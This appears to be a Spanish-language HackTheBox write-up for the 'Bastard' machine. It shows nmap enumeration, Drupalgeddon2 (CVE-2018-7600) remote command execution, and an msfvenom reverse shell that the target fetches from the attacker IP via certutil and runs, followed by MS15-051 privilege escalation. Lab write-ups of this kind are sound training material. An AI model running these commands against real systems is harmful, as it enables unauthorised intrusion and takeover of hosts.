---
redirect_from:
  - /posts/BASTARD-WriteUp/

title: "Bastard - WriteUp"
date: Sat Nov 23 2024 22:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, cve-2018-7600, reverse-shell, cve, exploit, msfvenom, drupal, windows]
image: /assets/img/htb-writeups/Pasted-image-20240214142432.png
---

{% include machine-info.html
  machine="Bastard"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Bastard](/assets/img/htb-writeups/Pasted-image-20240214142432.png)

---

---
----

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214142432.png)

Bastard no es demasiado desafiante, sin embargo requiere cierto conocimiento de PHP para poder modificar y utilizar la prueba de concepto requerida para la entrada inicial. Esta máquina demuestra la gravedad potencial de las vulnerabilidades en los sistemas de gestión de contenidos.

-------

#### ENUM

NMAP
```bash
# Nmap 7.94SVN scan initiated Wed Feb 14 14:26:38 2024 as: nmap -sCV -p 80,135,49154 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bo
otstrap.xsl -oN targeted -oX targetedXML 10.129.164.211
Nmap scan report for 10.129.164.211
Host is up (0.046s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

HTTP

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214180535.png)

```
Drupal 7.54, 2017-02-01
```

Exploit 
https://github.com/pimps/CVE-2018-7600

```bash
$ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'dir c:\users'
```

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214185953.png)

Como tenemos ejecución remota de comandos, vamos a intentar subir un archivo que nos envíe una reverse shell:

Creamos el ejecutable con _msfvenom_:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.87 LPORT=443 -f exe -o reverse.exe
```

Levantamos un servidor HTTP para que la máquina victima coja el archivo creado:

```bash
$ python3 -m http.server 80
```

Nos quedamos a la espera con NetCat o Penelope.

```bash
$ nc -nlvp 443
```

Luego ejecutando varias veces el exploit, crearemos una carpeta en C: que llamaremos "tmp", subiremos el ejecutable malicioso y lo ejecutaremos.

```bash
$ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'mkdir "C:\tmp"'
$ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'certutil.exe -f -urlcache -split http://10.10.14.87/reverse.exe c:\tmp\reverse.exe'
$ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'c:\tmp\reverse.exe'
```

Y pa dentro...

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214191759.png)

En este momento podemos registra la primera bandera que está en el escritorio del usuario _dimitris_.

Vamos a ver qué versión de Windows es:

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214194656.png)

Es un sistema muy antiguo, tiene exploits a reventar.

Nos bajamos el exploit de https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip y le subimos la versión de 64bits.

Creamos otro ejecutable con _msfvenom_ que escuche en el puerto 4444 por ejemplo y lo subimos también.

Nos ponemos a la escucha por el puerto 4444 y ejecutamos el exploit con el archivo de msfvenom creado.

```PowerShell
> .\ms15-051x64.exe .\reverse4444.exe
```

![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214194603.png)
---

**Última actualización**: 2024-11-23<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
